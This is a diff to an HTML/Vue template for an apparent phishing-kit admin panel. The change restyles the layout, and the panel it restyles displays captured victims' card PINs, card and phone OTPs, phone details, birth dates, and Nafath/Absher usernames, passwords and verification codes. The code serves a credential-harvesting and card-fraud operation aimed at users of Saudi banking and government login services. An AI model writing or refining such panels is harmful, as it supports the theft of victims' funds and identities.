@@ -87,28 +87,55 @@
       <!-- PIN / OTP / Nafath 3-columns -->
       <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">
         <div class="admin-glass space-y-2.5">
-          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
+          <h4 class="admin-section-title mb-0 pb-2">
             <span class="admin-dot admin-dot--blue"></span> Card PIN/OTP
           </h4>
-          <div class="text-sm"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestPin(customer) || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Card OTP:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestCardOtp(customer) || '—' }}</span></div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">PIN</span>
+            <span class="admin-data-value mono text-blue-400">{{ getLatestPin(customer) || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Card OTP</span>
+            <span class="admin-data-value mono text-blue-400">{{ getLatestCardOtp(customer) || '—' }}</span>
+          </div>
         </div>
         <div class="admin-glass space-y-2.5">
-          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-orange-400">
+          <h4 class="admin-section-title mb-0 pb-2">
             <span class="admin-dot admin-dot--orange"></span> Phone/OTP
           </h4>
-          <div class="text-sm"><span class="text-gray-500">Phone:</span> <span class="font-mono text-white">{{ customer?.phone || customer?.phoneNumber || customer?.phone_number || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Operator:</span> <span class="font-medium text-white">{{ customer?.phone_carrier || customer?.carrier || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Birth Date:</span> <span class="text-white">{{ customer?.birth_date || customer?.birthDate || customer?.phone_verification?.birth_date || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Phone OTP:</span> <span class="font-mono font-bold text-orange-400">{{ getLatestPhoneOtp(customer) || '—' }}</span></div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Phone</span>
+            <span class="admin-data-value mono">{{ customer?.phone || customer?.phoneNumber || customer?.phone_number || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Operator</span>
+            <span class="admin-data-value">{{ customer?.phone_carrier || customer?.carrier || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Birth Date</span>
+            <span class="admin-data-value">{{ customer?.birth_date || customer?.birthDate || customer?.phone_verification?.birth_date || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Phone OTP</span>
+            <span class="admin-data-value mono text-orange-400">{{ getLatestPhoneOtp(customer) || '—' }}</span>
+          </div>
         </div>
         <div class="admin-glass space-y-2.5">
-          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-purple-400">
+          <h4 class="admin-section-title mb-0 pb-2">
             <span class="admin-dot admin-dot--purple"></span> Nafath/Absher
           </h4>
-          <div class="text-sm"><span class="text-gray-500">User:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.username || customer?.nafath?.username || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Pass:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.password || '—' }}</span></div>
-          <div class="text-sm"><span class="text-gray-500">Code:</span> <span class="font-mono font-bold text-purple-400">{{ getLatestNafath(customer)?.verification_code || '—' }}</span></div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">User</span>
+            <span class="admin-data-value mono">{{ getLatestNafath(customer)?.username || customer?.nafath?.username || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Pass</span>
+            <span class="admin-data-value mono">{{ getLatestNafath(customer)?.password || '—' }}</span>
+          </div>
+          <div class="admin-data-field">
+            <span class="admin-data-label">Code</span>
+            <span class="admin-data-value mono text-purple-400">{{ getLatestNafath(customer)?.verification_code || '—' }}</span>
+          </div>
         </div>
       </div>
 
